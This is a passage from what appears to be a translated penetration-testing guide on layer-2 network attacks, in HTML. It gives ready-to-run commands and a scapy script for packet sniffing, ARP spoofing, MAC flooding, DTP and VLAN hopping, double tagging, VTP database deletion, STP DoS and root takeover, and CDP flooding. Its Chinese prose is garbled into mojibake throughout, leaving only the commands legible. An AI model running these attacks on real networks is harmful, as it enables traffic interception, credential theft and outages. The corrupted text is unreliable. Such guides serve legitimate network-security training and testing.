IP 10.10.0.2 &gt; 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
</code></pre>
<h2 id="sniffing"><a class="header" href="#sniffing">Sniffing</a></h2>
<p>é€šè¿‡å—…æ¢ï¼Œæ‚¨å¯ä»¥é€šè¿‡æŸ¥çœ‹æ•è·çš„å¸§å’Œæ•°æ®åŒ…æ¥äº†è§£ IP èŒƒå›´ã€å­ç½‘å¤§å°ã€MAC åœ°å€å’Œä¸»æœºåã€‚å¦‚æœç½‘ç»œé…ç½®é”™è¯¯æˆ–äº¤æ¢ fabric å¤„äºå‹åŠ›çŠ¶æ€ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡è¢«åŠ¨ç½‘ç»œå—…æ¢æ•è·æ•æ„Ÿææ–™ã€‚</p>
<p>å¦‚æœäº¤æ¢ä»¥å¤ªç½‘ç½‘ç»œé…ç½®æ­£ç¡®ï¼Œæ‚¨å°†åªçœ‹åˆ°å¹¿æ’­å¸§å’Œå‘å¾€æ‚¨ MAC åœ°å€çš„ææ–™ã€‚</p>
<h3 id="tcpdump"><a class="header" href="#tcpdump">TCPDump</a></h3>
<pre><code class="language-bash">sudo tcpdump -i &lt;INTERFACE&gt; udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i &lt;IFACE&gt; icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &amp;"
</code></pre>
<p>å¯ä»¥é€šè¿‡SSHä¼šè¯ä½¿ç”¨Wiresharkä½œä¸ºGUIå®æ—¶æ•è·æ¥è‡ªè¿œç¨‹æœºå™¨çš„æ•°æ®åŒ…ã€‚</p>
<pre><code>ssh user@&lt;TARGET IP&gt; tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh &lt;USERNAME&gt;@&lt;TARGET IP&gt; tcpdump -i &lt;INTERFACE&gt; -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
</code></pre>
<h3 id="bettercap"><a class="header" href="#bettercap">Bettercap</a></h3>
<pre><code class="language-bash">net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
</code></pre>
<h3 id="wireshark"><a class="header" href="#wireshark">Wireshark</a></h3>
<p>æ˜¾ç„¶ã€‚</p>
<h3 id="æ•è·å‡­è¯"><a class="header" href="#æ•è·å‡­è¯">æ•è·å‡­è¯</a></h3>
<p>æ‚¨å¯ä»¥ä½¿ç”¨åƒ <a href="https://github.com/lgandx/PCredz">https://github.com/lgandx/PCredz</a> è¿™æ ·çš„å·¥å…·ä» pcap æˆ–å®æ—¶æ¥å£ä¸­è§£æå‡­è¯ã€‚</p>
<h2 id="lan-æ”»å‡»"><a class="header" href="#lan-æ”»å‡»">LAN æ”»å‡»</a></h2>
<h3 id="arp-æ¬ºéª—"><a class="header" href="#arp-æ¬ºéª—">ARP æ¬ºéª—</a></h3>
<p>ARP æ¬ºéª—æ˜¯æŒ‡å‘é€æ— å¿çš„ ARP å“åº”ï¼Œä»¥æŒ‡ç¤ºæŸå°æœºå™¨çš„ IP åœ°å€å…·æœ‰æˆ‘ä»¬è®¾å¤‡çš„ MAC åœ°å€ã€‚ç„¶åï¼Œå—å®³è€…å°†æ›´æ”¹ ARP è¡¨ï¼Œå¹¶åœ¨æ¯æ¬¡æƒ³è¦è”ç³»ä¼ªé€ çš„ IP æ—¶ä¸æˆ‘ä»¬çš„æœºå™¨è”ç³»ã€‚</p>
<h4 id="bettercap-1"><a class="header" href="#bettercap-1"><strong>Bettercap</strong></a></h4>
<pre><code class="language-bash">arp.spoof on
set arp.spoof.targets &lt;IP&gt; #Specific targets to ARP spoof (default=&lt;entire subnet&gt;)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
</code></pre>
<h4 id="arpspoof"><a class="header" href="#arpspoof"><strong>Arpspoof</strong></a></h4>
<pre><code class="language-bash">echo 1 &gt; /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
</code></pre>
<h3 id="mac-flooding---cam-overflow"><a class="header" href="#mac-flooding---cam-overflow">MAC Flooding - CAM overflow</a></h3>
<p>é€šè¿‡å‘é€å¤§é‡å…·æœ‰ä¸åŒæº MAC åœ°å€çš„æ•°æ®åŒ…æ¥æº¢å‡ºäº¤æ¢æœºçš„ CAM è¡¨ã€‚å½“ CAM è¡¨æ»¡æ—¶ï¼Œäº¤æ¢æœºå¼€å§‹åƒé›†çº¿å™¨ä¸€æ ·å·¥ä½œï¼ˆå¹¿æ’­æ‰€æœ‰æµé‡ï¼‰ã€‚</p>
<pre><code class="language-bash">macof -i &lt;interface&gt;
</code></pre>
<p>åœ¨ç°ä»£äº¤æ¢æœºä¸­ï¼Œè¿™ä¸ªæ¼æ´å·²ç»è¢«ä¿®å¤ã€‚</p>
<h3 id="8021q-vlan--dtp-æ”»å‡»"><a class="header" href="#8021q-vlan--dtp-æ”»å‡»">802.1Q VLAN / DTP æ”»å‡»</a></h3>
<h4 id="åŠ¨æ€å¹²é“"><a class="header" href="#åŠ¨æ€å¹²é“">åŠ¨æ€å¹²é“</a></h4>
<p><strong>åŠ¨æ€å¹²é“åè®® (DTP)</strong> è¢«è®¾è®¡ä¸ºä¸€ä¸ªé“¾è·¯å±‚åè®®ï¼Œä»¥ä¾¿äºè‡ªåŠ¨åŒ–çš„å¹²é“ç³»ç»Ÿï¼Œä½¿äº¤æ¢æœºèƒ½å¤Ÿè‡ªåŠ¨é€‰æ‹©å¹²é“æ¨¡å¼ (Trunk) æˆ–éå¹²é“æ¨¡å¼çš„ç«¯å£ã€‚<strong>DTP</strong> çš„éƒ¨ç½²é€šå¸¸è¢«è§†ä¸ºç½‘ç»œè®¾è®¡ä¸ä½³çš„æ ‡å¿—ï¼Œå¼ºè°ƒäº†ä»…åœ¨å¿…è¦æ—¶æ‰‹åŠ¨é…ç½®å¹²é“çš„é‡è¦æ€§ï¼Œå¹¶ç¡®ä¿é€‚å½“çš„æ–‡æ¡£è®°å½•ã€‚</p>
<p>é»˜è®¤æƒ…å†µä¸‹ï¼Œäº¤æ¢æœºç«¯å£è®¾ç½®ä¸ºåŠ¨æ€è‡ªåŠ¨æ¨¡å¼ï¼Œè¿™æ„å‘³ç€å®ƒä»¬å‡†å¤‡åœ¨é‚»è¿‘äº¤æ¢æœºçš„æç¤ºä¸‹å¯åŠ¨å¹²é“ã€‚å½“æ¸—é€æµ‹è¯•è€…æˆ–æ”»å‡»è€…è¿æ¥åˆ°äº¤æ¢æœºå¹¶å‘é€ DTP Desirable å¸§æ—¶ï¼Œä¼šå¼•å‘å®‰å…¨é—®é¢˜ï¼Œè¿«ä½¿ç«¯å£è¿›å…¥å¹²é“æ¨¡å¼ã€‚è¿™ä¸€è¡Œä¸ºä½¿æ”»å‡»è€…èƒ½å¤Ÿé€šè¿‡ STP å¸§åˆ†ææšä¸¾ VLANï¼Œå¹¶é€šè¿‡è®¾ç½®è™šæ‹Ÿæ¥å£æ¥ç»•è¿‡ VLAN åˆ†æ®µã€‚</p>
<p>è®¸å¤šäº¤æ¢æœºé»˜è®¤å­˜åœ¨ DTPï¼Œæ•Œæ‰‹å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹æ¨¡ä»¿äº¤æ¢æœºçš„è¡Œä¸ºï¼Œä»è€Œè·å¾—å¯¹æ‰€æœ‰ VLAN æµé‡çš„è®¿é—®ã€‚è„šæœ¬ <a href="https://github.com/commonexploits/dtpscan"><em><strong>dtpscan.sh</strong></em></a> ç”¨äºç›‘æ§æ¥å£ï¼Œæ­ç¤ºäº¤æ¢æœºæ˜¯å¦å¤„äºé»˜è®¤ã€å¹²é“ã€åŠ¨æ€ã€è‡ªåŠ¨æˆ–æ¥å…¥æ¨¡å¼â€”â€”åè€…æ˜¯å”¯ä¸€å…å— VLAN è·³è·ƒæ”»å‡»çš„é…ç½®ã€‚è¯¥å·¥å…·è¯„ä¼°äº¤æ¢æœºçš„æ¼æ´çŠ¶æ€ã€‚</p>
<p>å¦‚æœå‘ç°ç½‘ç»œæ¼æ´ï¼Œå¯ä»¥ä½¿ç”¨ <em><strong>Yersinia</strong></em> å·¥å…·é€šè¿‡ DTP åè®®â€œå¯ç”¨å¹²é“â€ï¼Œä»¥ä¾¿è§‚å¯Ÿæ¥è‡ªæ‰€æœ‰ VLAN çš„æ•°æ®åŒ…ã€‚</p>
<pre><code class="language-bash">apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
</code></pre>
<p><img src="../../.gitbook/assets/image%20(269).png" alt="" /></p>
<p>è¦æšä¸¾VLANï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨è„šæœ¬<a href="https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py"><strong>DTPHijacking.py</strong></a>**ç”ŸæˆDTP Desirableå¸§ã€‚**åœ¨ä»»ä½•æƒ…å†µä¸‹éƒ½ä¸è¦ä¸­æ–­è„šæœ¬ã€‚å®ƒæ¯ä¸‰ç§’æ³¨å…¥ä¸€æ¬¡DTP Desirableã€‚<strong>äº¤æ¢æœºä¸ŠåŠ¨æ€åˆ›å»ºçš„å¹²é“é€šé“ä»…æŒç»­äº”åˆ†é’Ÿã€‚äº”åˆ†é’Ÿåï¼Œå¹²é“å°†å¤±æ•ˆã€‚</strong></p>
<pre><code>sudo python3 DTPHijacking.py --interface eth0
</code></pre>
<p>æˆ‘æƒ³æŒ‡å‡ºï¼Œ<strong>Access/Desirable (0x03)</strong> è¡¨ç¤º DTP å¸§æ˜¯ Desirable ç±»å‹ï¼Œè¿™å‘Šè¯‰ç«¯å£åˆ‡æ¢åˆ° Trunk æ¨¡å¼ã€‚å¹¶ä¸” <strong>802.1Q/802.1Q (0xa5)</strong> è¡¨ç¤º <strong>802.1Q</strong> å°è£…ç±»å‹ã€‚</p>
<p>é€šè¿‡åˆ†æ STP å¸§ï¼Œ<strong>æˆ‘ä»¬äº†è§£åˆ° VLAN 30 å’Œ VLAN 60 çš„å­˜åœ¨ã€‚</strong></p>
<figure><img src="../../.gitbook/assets/image (124).png" alt=""><figcaption></figcaption></figure>
<h4 id="æ”»å‡»ç‰¹å®š-vlan"><a class="header" href="#æ”»å‡»ç‰¹å®š-vlan">æ”»å‡»ç‰¹å®š VLAN</a></h4>
<p>ä¸€æ—¦ä½ çŸ¥é“ VLAN ID å’Œ IP å€¼ï¼Œä½ å¯ä»¥ <strong>é…ç½®ä¸€ä¸ªè™šæ‹Ÿæ¥å£æ¥æ”»å‡»ç‰¹å®š VLAN</strong>ã€‚<br />
å¦‚æœ DHCP ä¸å¯ç”¨ï¼Œåˆ™ä½¿ç”¨ <em>ifconfig</em> è®¾ç½®é™æ€ IP åœ°å€ã€‚</p>
<pre><code>root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
</code></pre>
<pre><code class="language-bash"># Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
</code></pre>
<pre><code class="language-bash"># Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
</code></pre>
<h4 id="è‡ªåŠ¨vlanè·³è·ƒ"><a class="header" href="#è‡ªåŠ¨vlanè·³è·ƒ">è‡ªåŠ¨VLANè·³è·ƒ</a></h4>
<p>è®¨è®ºçš„æ”»å‡»<strong>åŠ¨æ€å¹²çº¿å’Œåˆ›å»ºè™šæ‹Ÿæ¥å£ä»¥å‘ç°å…¶ä»–VLANä¸­çš„ä¸»æœº</strong>ç”±å·¥å…·**<a href="https://github.com/nccgroup/vlan-hopping---frogger">https://github.com/nccgroup/vlan-hopping---frogger</a>**è‡ªåŠ¨æ‰§è¡Œã€‚</p>
<h4 id="åŒé‡æ ‡è®°"><a class="header" href="#åŒé‡æ ‡è®°">åŒé‡æ ‡è®°</a></h4>
<p>å¦‚æœæ”»å‡»è€…çŸ¥é“<strong>å—å®³ä¸»æœºçš„MACã€IPå’ŒVLAN ID</strong>çš„å€¼ï¼Œä»–å¯ä»¥å°è¯•<strong>åŒé‡æ ‡è®°ä¸€ä¸ªå¸§</strong>ï¼Œä½¿ç”¨å…¶æŒ‡å®šçš„VLANå’Œå—å®³è€…çš„VLANå¹¶å‘é€ä¸€ä¸ªæ•°æ®åŒ…ã€‚ç”±äº<strong>å—å®³è€…æ— æ³•ä¸æ”»å‡»è€…è¿æ¥</strong>ï¼Œå› æ­¤<strong>æ”»å‡»è€…çš„æœ€ä½³é€‰æ‹©æ˜¯é€šè¿‡UDPè¿›è¡Œé€šä¿¡</strong>ï¼Œä¸å¯ä»¥æ‰§è¡Œä¸€äº›æœ‰è¶£æ“ä½œçš„åè®®ï¼ˆå¦‚SNMPï¼‰ã€‚</p>
<p>æ”»å‡»è€…çš„å¦ä¸€ä¸ªé€‰æ‹©æ˜¯å‘èµ·<strong>TCPç«¯å£æ‰«æï¼Œä¼ªè£…æˆä¸€ä¸ªç”±æ”»å‡»è€…æ§åˆ¶å¹¶ä¸”å—å®³è€…å¯ä»¥è®¿é—®çš„IP</strong>ï¼ˆå¯èƒ½é€šè¿‡äº’è”ç½‘ï¼‰ã€‚ç„¶åï¼Œæ”»å‡»è€…å¯ä»¥åœ¨ä»–æ‹¥æœ‰çš„ç¬¬äºŒä¸ªä¸»æœºä¸Šå—…æ¢ï¼Œå¦‚æœå®ƒæ¥æ”¶åˆ°æ¥è‡ªå—å®³è€…çš„ä¸€äº›æ•°æ®åŒ…ã€‚</p>
<p><img src="../../.gitbook/assets/image%20(190).png" alt="" /></p>
<p>è¦æ‰§è¡Œæ­¤æ”»å‡»ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨scapyï¼š<code>pip install scapy</code></p>
<pre><code class="language-python">from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
</code></pre>
<h4 id="lateral-vlan-segmentation-bypass"><a class="header" href="#lateral-vlan-segmentation-bypass">Lateral VLAN Segmentation Bypass <a href="#d679" id="d679"></a></a></h4>
<p>å¦‚æœæ‚¨<strong>å¯ä»¥è®¿é—®ç›´æ¥è¿æ¥çš„äº¤æ¢æœº</strong>ï¼Œæ‚¨å°±æœ‰èƒ½åŠ›<strong>ç»•è¿‡ VLAN åˆ†æ®µ</strong>ã€‚åªéœ€<strong>å°†ç«¯å£åˆ‡æ¢åˆ°å¹²é“æ¨¡å¼</strong>ï¼ˆä¹Ÿç§°ä¸ºå¹²é“ï¼‰ï¼Œåˆ›å»ºå…·æœ‰ç›®æ ‡ VLAN ID çš„è™šæ‹Ÿæ¥å£ï¼Œå¹¶é…ç½® IP åœ°å€ã€‚æ‚¨å¯ä»¥å°è¯•åŠ¨æ€è¯·æ±‚åœ°å€ï¼ˆDHCPï¼‰ï¼Œæˆ–è€…å¯ä»¥é™æ€é…ç½®ã€‚å…·ä½“å–å†³äºæƒ…å†µã€‚</p>
<p>{% content-ref url="lateral-vlan-segmentation-bypass.md" %}
<a href="lateral-vlan-segmentation-bypass.html">lateral-vlan-segmentation-bypass.md</a>
{% endcontent-ref %}</p>
<h4 id="layer-3-private-vlan-bypass"><a class="header" href="#layer-3-private-vlan-bypass">Layer 3 Private VLAN Bypass</a></h4>
<p>åœ¨æŸäº›ç¯å¢ƒä¸­ï¼Œä¾‹å¦‚è®¿å®¢æ— çº¿ç½‘ç»œï¼Œ**ç«¯å£éš”ç¦»ï¼ˆä¹Ÿç§°ä¸ºç§æœ‰ VLANï¼‰**è®¾ç½®è¢«å®æ–½ï¼Œä»¥é˜²æ­¢è¿æ¥åˆ°æ— çº¿æ¥å…¥ç‚¹çš„å®¢æˆ·ç«¯ç›´æ¥ç›¸äº’é€šä¿¡ã€‚ç„¶è€Œï¼Œå·²ç»è¯†åˆ«å‡ºä¸€ç§å¯ä»¥è§„é¿è¿™äº›éš”ç¦»æªæ–½çš„æŠ€æœ¯ã€‚è¯¥æŠ€æœ¯åˆ©ç”¨ç½‘ç»œ ACL çš„ç¼ºå¤±æˆ–é…ç½®ä¸å½“ï¼Œä½¿å¾— IP æ•°æ®åŒ…èƒ½å¤Ÿé€šè¿‡è·¯ç”±å™¨è·¯ç”±åˆ°åŒä¸€ç½‘ç»œä¸Šçš„å¦ä¸€ä¸ªå®¢æˆ·ç«¯ã€‚</p>
<p>æ”»å‡»æ˜¯é€šè¿‡åˆ›å»ºä¸€ä¸ª<strong>æºå¸¦ç›®æ ‡å®¢æˆ·ç«¯ IP åœ°å€ä½†å¸¦æœ‰è·¯ç”±å™¨ MAC åœ°å€çš„åŒ…</strong>æ¥æ‰§è¡Œçš„ã€‚è¿™å¯¼è‡´è·¯ç”±å™¨é”™è¯¯åœ°å°†æ•°æ®åŒ…è½¬å‘ç»™ç›®æ ‡å®¢æˆ·ç«¯ã€‚è¿™ç§æ–¹æ³•ç±»ä¼¼äºåŒæ ‡è®°æ”»å‡»ä¸­ä½¿ç”¨çš„æ–¹æ³•ï¼Œå…¶ä¸­åˆ©ç”¨å¯è®¿é—®å—å®³è€…çš„ä¸»æœºçš„èƒ½åŠ›æ¥åˆ©ç”¨å®‰å…¨æ¼æ´ã€‚</p>
<p><strong>æ”»å‡»çš„å…³é”®æ­¥éª¤ï¼š</strong></p>
<ol>
<li><strong>æ„é€ æ•°æ®åŒ…ï¼š</strong> ç‰¹åˆ«æ„é€ ä¸€ä¸ªæ•°æ®åŒ…ï¼Œä»¥åŒ…å«ç›®æ ‡å®¢æˆ·ç«¯çš„ IP åœ°å€ï¼Œä½†å¸¦æœ‰è·¯ç”±å™¨çš„ MAC åœ°å€ã€‚</li>
<li><strong>åˆ©ç”¨è·¯ç”±å™¨è¡Œä¸ºï¼š</strong> å°†æ„é€ çš„æ•°æ®åŒ…å‘é€åˆ°è·¯ç”±å™¨ï¼Œç”±äºé…ç½®åŸå› ï¼Œè·¯ç”±å™¨å°†æ•°æ®åŒ…é‡å®šå‘åˆ°ç›®æ ‡å®¢æˆ·ç«¯ï¼Œç»•è¿‡ç§æœ‰ VLAN è®¾ç½®æä¾›çš„éš”ç¦»ã€‚</li>
</ol>
<h3 id="vtp-attacks"><a class="header" href="#vtp-attacks">VTP Attacks</a></h3>
<p>VTPï¼ˆVLAN Trunking Protocolï¼‰é›†ä¸­ç®¡ç† VLANã€‚å®ƒåˆ©ç”¨ä¿®è®¢å·æ¥ç»´æŠ¤ VLAN æ•°æ®åº“çš„å®Œæ•´æ€§ï¼›ä»»ä½•ä¿®æ”¹éƒ½ä¼šå¢åŠ æ­¤æ•°å­—ã€‚äº¤æ¢æœºé‡‡ç”¨å…·æœ‰æ›´é«˜ä¿®è®¢å·çš„é…ç½®ï¼Œæ›´æ–°è‡ªå·±çš„ VLAN æ•°æ®åº“ã€‚</p>
<h4 id="vtp-domain-roles"><a class="header" href="#vtp-domain-roles">VTP Domain Roles</a></h4>
<ul>
<li><strong>VTP Server:</strong> ç®¡ç† VLANâ€”â€”åˆ›å»ºã€åˆ é™¤ã€ä¿®æ”¹ã€‚å®ƒå‘åŸŸæˆå‘˜å¹¿æ’­ VTP é€šå‘Šã€‚</li>
<li><strong>VTP Client:</strong> æ¥æ”¶ VTP é€šå‘Šä»¥åŒæ­¥å…¶ VLAN æ•°æ®åº“ã€‚æ­¤è§’è‰²é™åˆ¶æœ¬åœ° VLAN é…ç½®ä¿®æ”¹ã€‚</li>
<li><strong>VTP Transparent:</strong> ä¸å‚ä¸ VTP æ›´æ–°ï¼Œä½†è½¬å‘ VTP é€šå‘Šã€‚ä¸å— VTP æ”»å‡»å½±å“ï¼Œä¿æŒä¿®è®¢å·ä¸ºé›¶ã€‚</li>
</ul>
<h4 id="vtp-advertisement-types"><a class="header" href="#vtp-advertisement-types">VTP Advertisement Types</a></h4>
<ul>
<li><strong>Summary Advertisement:</strong> æ¯ 300 ç§’ç”± VTP æœåŠ¡å™¨å¹¿æ’­ï¼Œæºå¸¦åŸºæœ¬åŸŸä¿¡æ¯ã€‚</li>
<li><strong>Subset Advertisement:</strong> åœ¨ VLAN é…ç½®æ›´æ”¹åå‘é€ã€‚</li>
<li><strong>Advertisement Request:</strong> ç”± VTP å®¢æˆ·ç«¯å‘å‡ºï¼Œè¯·æ±‚ Summary Advertisementï¼Œé€šå¸¸æ˜¯å“åº”æ£€æµ‹åˆ°æ›´é«˜çš„é…ç½®ä¿®è®¢å·ã€‚</li>
</ul>
<p>VTP æ¼æ´ä»…é€šè¿‡å¹²é“ç«¯å£å¯è¢«åˆ©ç”¨ï¼Œå› ä¸º VTP é€šå‘Šä»…é€šè¿‡è¿™äº›ç«¯å£ä¼ æ’­ã€‚åœ¨ DTP æ”»å‡»åœºæ™¯ä¹‹åï¼Œå¯èƒ½ä¼šè½¬å‘ VTPã€‚åƒ Yersinia è¿™æ ·çš„å·¥å…·å¯ä»¥ä¿ƒè¿› VTP æ”»å‡»ï¼Œæ—¨åœ¨æ¸…é™¤ VLAN æ•°æ®åº“ï¼Œæœ‰æ•ˆåœ°ç ´åç½‘ç»œã€‚</p>
<p>æ³¨æ„ï¼šæœ¬è®¨è®ºæ¶‰åŠ VTP ç‰ˆæœ¬ 1ï¼ˆVTPv1ï¼‰ã€‚</p>
<pre><code class="language-bash">%% yersinia -G # Launch Yersinia in graphical mode ```
</code></pre>
<p>åœ¨Yersiniaçš„å›¾å½¢æ¨¡å¼ä¸­ï¼Œé€‰æ‹©åˆ é™¤æ‰€æœ‰VTP VLANé€‰é¡¹ä»¥æ¸…é™¤VLANæ•°æ®åº“ã€‚</p>
<h3 id="stpæ”»å‡»"><a class="header" href="#stpæ”»å‡»">STPæ”»å‡»</a></h3>
<p><strong>å¦‚æœæ‚¨æ— æ³•åœ¨æ¥å£ä¸Šæ•è·BPDUå¸§ï¼Œé‚£ä¹ˆæ‚¨åœ¨STPæ”»å‡»ä¸­æˆåŠŸçš„å¯èƒ½æ€§ä¸å¤§ã€‚</strong></p>
<h4 id="stp-bpdu-dos"><a class="header" href="#stp-bpdu-dos"><strong>STP BPDU DoS</strong></a></h4>
<p>å‘é€å¤§é‡çš„BPDUs TCPï¼ˆæ‹“æ‰‘å˜åŒ–é€šçŸ¥ï¼‰æˆ–Confï¼ˆåœ¨åˆ›å»ºæ‹“æ‰‘æ—¶å‘é€çš„BPDUsï¼‰ï¼Œäº¤æ¢æœºä¼šè¿‡è½½å¹¶åœæ­¢æ­£å¸¸å·¥ä½œã€‚</p>
<pre><code class="language-bash">yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
</code></pre>
<h4 id="stp-tcpæ”»å‡»"><a class="header" href="#stp-tcpæ”»å‡»"><strong>STP TCPæ”»å‡»</strong></a></h4>
<p>å½“å‘é€TCPæ—¶ï¼Œäº¤æ¢æœºçš„CAMè¡¨å°†åœ¨15ç§’å†…è¢«åˆ é™¤ã€‚ç„¶åï¼Œå¦‚æœæ‚¨æŒç»­å‘é€è¿™ç§æ•°æ®åŒ…ï¼ŒCAMè¡¨å°†ä¸æ–­é‡å¯ï¼ˆæˆ–æ¯15ç§’é‡å¯ä¸€æ¬¡ï¼‰ï¼Œå½“å®ƒé‡å¯æ—¶ï¼Œäº¤æ¢æœºçš„è¡Œä¸ºå°±åƒä¸€ä¸ªé›†çº¿å™¨ã€‚</p>
<pre><code class="language-bash">yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
</code></pre>
<h4 id="stp-root-attack"><a class="header" href="#stp-root-attack"><strong>STP Root Attack</strong></a></h4>
<p>æ”»å‡»è€…æ¨¡æ‹Ÿäº¤æ¢æœºçš„è¡Œä¸ºï¼Œä»¥æˆä¸ºç½‘ç»œçš„ STP æ ¹ã€‚ç„¶åï¼Œæ›´å¤šçš„æ•°æ®å°†é€šè¿‡ä»–ä¼ è¾“ã€‚å½“ä½ è¿æ¥åˆ°ä¸¤ä¸ªä¸åŒçš„äº¤æ¢æœºæ—¶ï¼Œè¿™ä¸€ç‚¹å¾ˆæœ‰è¶£ã€‚<br />
è¿™æ˜¯é€šè¿‡å‘é€ BPDUs CONF æ•°æ®åŒ…æ¥å®Œæˆçš„ï¼Œå£°ç§° <strong>ä¼˜å…ˆçº§</strong> å€¼ä½äºå®é™…æ ¹äº¤æ¢æœºçš„å®é™…ä¼˜å…ˆçº§ã€‚</p>
<pre><code class="language-bash">yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
</code></pre>
<p><strong>å¦‚æœæ”»å‡»è€…è¿æ¥åˆ°ä¸¤ä¸ªäº¤æ¢æœºï¼Œä»–å¯ä»¥æˆä¸ºæ–°æ ‘çš„æ ¹ï¼Œæ‰€æœ‰åœ¨è¿™äº›äº¤æ¢æœºä¹‹é—´çš„æµé‡å°†é€šè¿‡ä»–</strong>ï¼ˆå°†æ‰§è¡ŒMITMæ”»å‡»ï¼‰ã€‚</p>
<pre><code class="language-bash">yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --&gt; "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
</code></pre>
<h3 id="cdp-æ”»å‡»"><a class="header" href="#cdp-æ”»å‡»">CDP æ”»å‡»</a></h3>
<p>CISCO å‘ç°åè®® (CDP) å¯¹äº CISCO è®¾å¤‡ä¹‹é—´çš„é€šä¿¡è‡³å…³é‡è¦ï¼Œä½¿å®ƒä»¬èƒ½å¤Ÿ <strong>ç›¸äº’è¯†åˆ«å¹¶å…±äº«é…ç½®ç»†èŠ‚</strong>ã€‚</p>
<h4 id="è¢«åŠ¨æ•°æ®æ”¶é›†"><a class="header" href="#è¢«åŠ¨æ•°æ®æ”¶é›†">è¢«åŠ¨æ•°æ®æ”¶é›† <a href="#id-0e0f" id="id-0e0f"></a></a></h4>
<p>CDP è¢«é…ç½®ä¸ºé€šè¿‡æ‰€æœ‰ç«¯å£å¹¿æ’­ä¿¡æ¯ï¼Œè¿™å¯èƒ½å¯¼è‡´å®‰å…¨é£é™©ã€‚æ”»å‡»è€…åœ¨è¿æ¥åˆ°äº¤æ¢æœºç«¯å£åï¼Œå¯ä»¥éƒ¨ç½²ç½‘ç»œå—…æ¢å™¨ï¼Œå¦‚ <strong>Wireshark</strong>ã€<strong>tcpdump</strong> æˆ– <strong>Yersinia</strong>ã€‚æ­¤æ“ä½œå¯ä»¥æ­ç¤ºæœ‰å…³ç½‘ç»œè®¾å¤‡çš„æ•æ„Ÿæ•°æ®ï¼ŒåŒ…æ‹¬å…¶å‹å·å’Œè¿è¡Œçš„ Cisco IOS ç‰ˆæœ¬ã€‚æ”»å‡»è€…å¯èƒ½ä¼šé’ˆå¯¹è¯†åˆ«å‡ºçš„ Cisco IOS ç‰ˆæœ¬ä¸­çš„ç‰¹å®šæ¼æ´ã€‚</p>
<h4 id="å¼•å‘-cdp-è¡¨æ³›æ´ª"><a class="header" href="#å¼•å‘-cdp-è¡¨æ³›æ´ª">å¼•å‘ CDP è¡¨æ³›æ´ª <a href="#id-0d6a" id="id-0d6a"></a></a></h4>
<p>ä¸€ç§æ›´æ¿€è¿›çš„æ–¹æ³•æ˜¯é€šè¿‡å‡è£…æ˜¯åˆæ³•çš„ CISCO è®¾å¤‡æ¥å‘èµ·æ‹’ç»æœåŠ¡ (DoS) æ”»å‡»ï¼Œä»è€Œå‹å€’äº¤æ¢æœºçš„å†…å­˜ã€‚ä»¥ä¸‹æ˜¯ä½¿ç”¨ Yersinia è¿™ä¸€ç½‘ç»œå·¥å…·å‘èµ·æ­¤ç±»æ”»å‡»çš„å‘½ä»¤åºåˆ—ï¼š</p>
<pre><code class="language-bash">sudo yersinia cdp -attack 1 # Initiates a DoS attack by simulating fake CISCO devices
# Alternatively, for a GUI approach:
sudo yersinia -G
</code></pre>
